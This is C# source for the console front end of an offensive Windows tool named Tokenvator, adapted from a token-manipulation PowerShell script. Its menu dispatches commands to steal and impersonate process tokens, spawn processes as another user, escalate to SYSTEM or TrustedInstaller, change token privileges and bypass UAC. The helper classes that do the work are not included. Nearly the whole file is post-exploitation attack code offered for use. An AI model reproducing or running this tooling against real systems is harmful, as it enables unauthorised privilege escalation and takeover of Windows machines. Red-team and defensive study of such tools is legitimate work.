using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Management.Instrumentation;
using System.Text;



////////////////////////////////////////////////////////////////////////////////
// https://github.com/clymb3r/PowerShell/blob/master/Invoke-TokenManipulation/Invoke-TokenManipulation.ps1
////////////////////////////////////////////////////////////////////////////////
namespace Tokenvator
{
    class Program
    {
        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        static void Main(string[] args)
        {
            Int32 processID;
            String command;
            IntPtr currentProcessToken;
            while (true)
            {
                try
                {
                    Console.Write("(Tokens) > ");
                    String input = Console.ReadLine();
                    
                    switch(NextItem(ref input))
                    {
                        case "listprivileges":
                            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
                            Tokens.EnumerateTokenPrivileges(currentProcessToken);
                            break;
                        case "setprivilege":
                            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
                            Tokens.SetTokenPrivilege(ref currentProcessToken, input);
                            break;
                        case "getsystem":
                            if (String.Empty == NextItem(ref input))
                            {
                                new Tokens().GetSystem();
                            }
                            else
                            {
                                new Tokens().GetSystem(input);
                            }
                            break;
                        case "gettrustedinstaller":
                            if (String.Empty != NextItem(ref input))
                            {
                                new Tokens().GetTrustedInstaller();
                            }
                            else
                            {
                                new Tokens().GetTrustedInstaller(input);
                            }
                            break;
                        case "stealtoken":
                            if (GetProcessID(input, out processID, out command))
                            {
                                if (String.IsNullOrEmpty(command))
                                {
                                    new Tokens().ImpersonateUser(processID);
                                }
                                else
                                {
                                    new Tokens().StartProcessAsUser(processID, command);
                                }
                            }
                            break;
                        case "bypassuac":
                            if (GetProcessID(input, out processID, out command))
                            {
                                new RestrictedToken().BypassUAC(processID, command);
                            }
                            break;
                        case "exit":
                            return;
                        default:
                            Console.WriteLine();
                            Console.WriteLine("Options");
                            Console.WriteLine("-------");
                            Console.WriteLine("GetSystem            <new_process>");
                            Console.WriteLine("GetTrustedInstaller  <new_process>");
                            Console.WriteLine("StealToken           <process_id> <new_process>");
                            Console.WriteLine();
                            Console.WriteLine("ListPrivileges       <process_id>");
                            Console.WriteLine("SetPrivilege         <process_id> <privilege>");
                            Console.WriteLine();
                            Console.WriteLine("BypassUAC            <process_id> <new_process>");
                            Console.WriteLine();
                            break;
                    }
                }
                catch (Exception error)
                {
                    Console.WriteLine(error.ToString());
                }
                finally
                {

                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Identifies a process to access
        ////////////////////////////////////////////////////////////////////////////////
        private static Boolean GetProcessID(String input, out Int32 processID, out String command)
        {
            String name = NextItem(ref input);
            command = "";
            if (String.IsNullOrEmpty(input))
            {
                command = "cmd.exe";
            }

            processID = 0;
            if (Int32.TryParse(name, out processID))
            {
                return true;
            }

            Process[] process = Process.GetProcessesByName(input);
            if (0 < process.Length)
            {
                processID = process.First().Id;
                return true;
            }
            return false;
        }
        
        ////////////////////////////////////////////////////////////////////////////////
        // Pops an item from the input and returns the item - only used in inital menu
        ////////////////////////////////////////////////////////////////////////////////
        public static String NextItem(ref String input)
        {
            String option = "";
            String[] options = input.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
            if (options.Length > 1)
            {
                option = options[0];
                input = String.Join(" ", options, 1, options.Length - 1);
            }
            else
            {
                option = input;
            }
            return option.ToLower();
        }
    }
}